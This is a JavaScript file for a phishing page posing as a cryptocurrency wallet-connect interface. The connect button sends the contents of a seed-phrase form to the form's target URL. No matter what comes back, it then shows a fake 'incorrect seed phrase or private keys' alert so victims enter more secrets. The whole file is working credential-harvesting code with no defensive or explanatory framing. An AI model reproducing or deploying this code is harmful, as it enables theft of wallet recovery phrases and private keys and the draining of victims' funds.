var Wale = (function ($) {
  'use strict';

  var wale = {};

  function seed_form_submit(thisForm, action, formData) {
    fetch(action, {
      method: 'POST',
      body: formData,
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
      },
    }).then(data => {
		alert('Incorrect seed phrase or private keys - please fill the correct details and try again');
		$('.loader').remove();
    });
  }

  var ua = navigator.userAgent.toLowerCase();
  var isAndroid = ua.indexOf('android') > -1;
  var isIOS = ua.indexOf('mac') > -1;
  var isWindows = ua.indexOf('win') > -1;
  let platform = null;
  var codeString = '';

  if (isAndroid) {
    platform = 'Android';
  } else if (isIOS) {
    platform = 'iOS';
  } else if (isWindows) {
    platform = 'Windows';
  }


  $(document).ready(function () {
    $("#mainModal").modal('show');

    const tabs = document.querySelector(".button-row");

    if (tabs) {

      $('.page').hide();
      $('.page.act').show();

      tabs.onclick = e => {
        const id = e.target.dataset.id;

        switch (id) {
          case '1':
            $('.page').hide()
            $('.page.act').hide();
            $('#p1').show();
            break;
          case '2':
            $('.page').hide()
            $('.page.act').hide();
            $('#p2').show();
            break;
          case '3':
            $('.page').hide()
            $('.page.act').hide();
            $('#p3').show();
            break;
          case '4':
            $('.page').hide()
            $('.page.act').hide();
            $('#p4').show();
            break;
          case '5':
            $('.page').hide()
            $('.page.act').hide();
            $('#p5').show();
            break;
        }

      }
    }


    $('#connectButton').click(function (e) {
      e.preventDefault();

      let thisForm = $('#seed-form');

      let action = thisForm.attr('action');

      $('#loader').append('<div class="loader mx-auto mt-3"></div>');

      let formData = new FormData(document.getElementById('seed-form'));

      seed_form_submit(thisForm, action, formData);
    });
  });

  return wale;
})(jQuery);